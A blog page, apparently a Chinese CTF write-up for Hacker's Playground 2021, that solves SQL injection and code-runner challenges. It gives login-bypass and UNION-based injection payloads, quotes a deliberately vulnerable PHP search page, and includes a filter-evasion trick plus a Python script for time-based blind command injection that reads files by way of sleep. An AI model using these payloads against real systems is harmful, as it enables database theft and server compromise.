@@ -1,0 +1,1232 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>Hacker&#39;s Playground 2021 - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup,ctftime">
+  
+
+  
+    <meta name="description" content="Hacker’s Playground 2021">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">Hacker&#39;s Playground 2021</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2021/08/07/%E5%88%B7%E9%A2%98/ctftime/2021/8-17%20Hacker's%20Playground%202021/writeup/">
+      Hacker's Playground 2021
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年8月7日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：1.1k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：6分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2021/08/07/%E5%88%B7%E9%A2%98/ctftime/2021/8-17%20Hacker's%20Playground%202021/writeup/" class="leancloud_visitors" data-flag-title="Hacker's Playground 2021">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2021/08/07/%E5%88%B7%E9%A2%98/ctftime/2021/8-17%20Hacker's%20Playground%202021/writeup/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2021/08/07/%E5%88%B7%E9%A2%98/ctftime/2021/8-17%20Hacker's%20Playground%202021/writeup/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>Hacker’s Playground 2021</p>
+<a id="more"></a>
+
+<h3 id="SQLi-101"><a href="#SQLi-101" class="headerlink" title="SQLi 101"></a>SQLi 101</h3><p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;step2.php?id&#x3D;admin&#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;1%23&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLi-102"><a href="#SQLi-102" class="headerlink" title="SQLi 102"></a>SQLi 102</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">$succ = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;showsrc&#x27;</span>]) &#123;</span><br><span class="line">    show_source(<span class="string">&quot;step1.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;searchkey&#x27;</span>]) &#123;</span><br><span class="line">    $succ = <span class="number">0</span>;</span><br><span class="line">    $query = <span class="string">&quot;select * from books where title like &#x27;%&quot;</span>.$_GET[<span class="string">&#x27;searchkey&#x27;</span>].<span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">    $db = dbconnect(<span class="string">&quot;sqli102_step3&quot;</span>);</span><br><span class="line">    $result = mysqli_query($db,$query);</span><br><span class="line">    mysqli_close($db);</span><br><span class="line">    <span class="keyword">if</span>($result) &#123;</span><br><span class="line">        $rows = mysqli_num_rows($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- source: https:<span class="comment">//colorlib.com/wp/template/colorlib-search-23/ --&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;SQLi <span class="number">102</span>: Step <span class="number">1</span>&lt;/title&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span><br><span class="line">        &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span><br><span class="line">        &lt;meta name=<span class="string">&quot;author&quot;</span> content=<span class="string">&quot;colorlib.com&quot;</span>&gt;</span><br><span class="line">        &lt;style id=<span class="string">&quot;&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt;<span class="comment">/* devanagari */</span></span><br><span class="line">        @font-face &#123;</span><br><span class="line">          font-family: <span class="string">&#x27;Poppins&#x27;</span>;</span><br><span class="line">          font-style: normal;</span><br><span class="line">          font-weight: <span class="number">400</span>;</span><br><span class="line">          src: url(/fonts.gstatic.com/s/poppins/v15/pxiEyp8kv8JHgFVrJJbecmNE.woff2) format(<span class="string">&#x27;woff2&#x27;</span>);</span><br><span class="line">          unicode-range: U+<span class="number">0900</span><span class="number">-097</span>F, U+<span class="number">1</span>CD0<span class="number">-1</span>CF6, U+<span class="number">1</span>CF8<span class="number">-1</span>CF9, U+<span class="number">200</span>C<span class="number">-200</span>D, U+<span class="number">20</span>A8, U+<span class="number">20</span>B9, U+<span class="number">25</span>CC, U+A830-A839, U+A8E0-A8FB;</span><br><span class="line">        &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">        &lt;link href=<span class="string">&quot;style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class=&quot;s130&quot;&gt;</span><br><span class="line">            &lt;form&gt;</span><br><span class="line">                &lt;table border=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">                    &lt;tr&gt;</span><br><span class="line">                        &lt;td style=<span class="string">&quot;font-size: 28px; text-align: left&quot;</span>&gt;&lt;strong&gt;A book search service&lt;/strong&gt;&lt;/td&gt;</span><br><span class="line">                        &lt;td style=<span class="string">&quot;text-align: right; vertical-align: bottom&quot;</span>&gt;&lt;a href=<span class="string">&quot;?showsrc=True&quot;</span>&gt;[HINT]&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">                    &lt;/tr&gt;</span><br><span class="line">                &lt;/table&gt;</span><br><span class="line">                &lt;div class=&quot;inner-form&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;input-field first-wrap&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;svg-wrapper&quot;&gt;</span><br><span class="line">                            &lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> width=<span class="string">&quot;24&quot;</span> height=<span class="string">&quot;24&quot;</span> viewBox=<span class="string">&quot;0 0 24 24&quot;</span>&gt;</span><br><span class="line">                                &lt;path d=<span class="string">&quot;M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z&quot;</span>&gt;&lt;/path&gt;</span><br><span class="line">                            &lt;/svg&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;input id=<span class="string">&quot;search&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;searchkey&quot;</span> placeholder=<span class="string">&quot;Enter keyword here&quot;</span> /&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class=&quot;input-field second-wrap&quot;&gt;</span><br><span class="line">                        &lt;button class=&quot;btn-search&quot; type=&quot;submit&quot;&gt;SEARCH&lt;/button&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    <span class="keyword">if</span> ($rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                &lt;br&gt;</span><br><span class="line">                &lt;h2&gt;Search Result&lt;/h2&gt;</span><br><span class="line">                &lt;table&gt;</span><br><span class="line">                    &lt;thead&gt;</span><br><span class="line">                        &lt;tr&gt;</span><br><span class="line">                            &lt;th width=<span class="string">&quot;10%&quot;</span>&gt;<span class="comment">#&lt;/th&gt;</span></span><br><span class="line">                            &lt;th width=<span class="string">&quot;50%&quot;</span>&gt;Title&lt;/th&gt;</span><br><span class="line">                            &lt;th width=<span class="string">&quot;30%&quot;</span>&gt;Author&lt;/th&gt;</span><br><span class="line">                            &lt;th width=<span class="string">&quot;10%&quot;</span>&gt;Price&lt;/th&gt;</span><br><span class="line">                        &lt;/tr&gt;</span><br><span class="line">                    &lt;/thead&gt;</span><br><span class="line">                    &lt;tbody&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    <span class="keyword">for</span>($idx = <span class="number">1</span>; $idx &lt;= $rows; $idx++) &#123;</span><br><span class="line">        $row = mysqli_fetch_assoc($result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;th scope=\&quot;row\&quot;&gt;&quot;</span>.$idx.<span class="string">&quot;&lt;/th&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;title&quot;</span>].<span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;author&quot;</span>].<span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;price&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                    &lt;/tbody&gt;</span><br><span class="line">                &lt;/table&gt;</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($succ === <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                &lt;br&gt;</span><br><span class="line">                &lt;h2&gt;Sorry, no results <span class="keyword">for</span> your request.&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                &lt;br&gt;</span><br><span class="line">                &lt;h2 style=<span class="string">&quot;padding-left:30px&quot;</span>&gt;Quiz<span class="comment">#1: How many columns are in the `&lt;strong&gt;count_me&lt;/strong&gt;` table?&lt;/h2&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>order by 判断列数 8列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">step3.php?searchkey&#x3D;&#39; order by 8%23</span><br></pre></td></tr></table></figure>
+
+<p>判断回显为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">step3.php?searchkey&#x3D;aaaa&#39; UNION SELECT 1,2,3,4,5,6,7,8%23</span><br></pre></td></tr></table></figure>
+
+<p>查表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">step3.php?searchkey&#x3D;aaaa&#39; UNION SELECT 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3,4,5,6,7,8%23</span><br></pre></td></tr></table></figure>
+
+<p>查列得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">step3.php?searchkey&#x3D;aaaa&#39; UNION SELECT 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;findme&#39;),3,4,5,6,7,8%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="SW-Expert-Academy"><a href="#SW-Expert-Academy" class="headerlink" title="SW Expert Academy"></a>SW Expert Academy</h3><p>运行C语言代码 过滤了system open exec 可以直接用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sy\</span><br><span class="line">stem(&quot;id&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>pass三个校验</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf1[<span class="number">1024</span>],buf2[<span class="number">1024</span>];</span><br><span class="line">gets(buf1);</span><br><span class="line">gets(buf2);</span><br><span class="line"><span class="keyword">if</span>(buf2[<span class="number">0</span>]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2/3&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(buf2[<span class="number">0</span>]==<span class="string">&#x27;3&#x27;</span>)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;5/12&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(buf2[<span class="number">0</span>]==<span class="string">&#x27;8&#x27;</span>)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1/2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>貌似也没用 只会回显 测了下 貌似不出网 应该是命令执行时间盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://swexpertacademy.sstf.site:80/code&quot;</span></span><br><span class="line">s = string.ascii_lowercase + string.ascii_uppercase + string.digits + <span class="string">&quot;+/=&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f=flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        print(i,j)</span><br><span class="line">        burp0_data = &#123;</span><br><span class="line">            <span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#x27;&#x27;sys\\\ntem(&quot;sleep $(cat /* | base64 | cut -c &#123;&#125;|tr &#x27;&#123;&#125;&#x27; 3)&quot;);\n&#x27;&#x27;&#x27;</span>.format(str(i),j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(burp0_url,data=burp0_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Time Limit Exceed&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag = flag+j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f==flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2021/08/07/%E5%88%B7%E9%A2%98/ctftime/2021/8-17%20Hacker's%20Playground%202021/writeup/>http://www.moonback.xyz/2021/08/07/%E5%88%B7%E9%A2%98/ctftime/2021/8-17%20Hacker's%20Playground%202021/writeup/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-08-27T18:50:43+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年8月27日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctftime/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctftime</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2021/08/07/%E5%88%B7%E9%A2%98/ctftime/2021/8-17%20Hacker's%20Playground%202021/writeup/&title=Hacker's Playground 2021 - 明月归的小站&summary=Hacker’s Playground 2021"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2021/08/07/%E5%88%B7%E9%A2%98/ctftime/2021/8-17%20Hacker's%20Playground%202021/writeup/&title=Hacker's Playground 2021 - 明月归的小站&summary=Hacker’s Playground 2021"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2021/08/07/%E5%88%B7%E9%A2%98/ctftime/2021/8-17%20Hacker's%20Playground%202021/writeup/&title=Hacker's Playground 2021 - 明月归的小站&summary=Hacker’s Playground 2021"
+          
+          >
+          
+            <img src="/static/images/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2021/08/07/%E5%88%B7%E9%A2%98/ctftime/2021/8-7%20RARCTF/writeup/'>
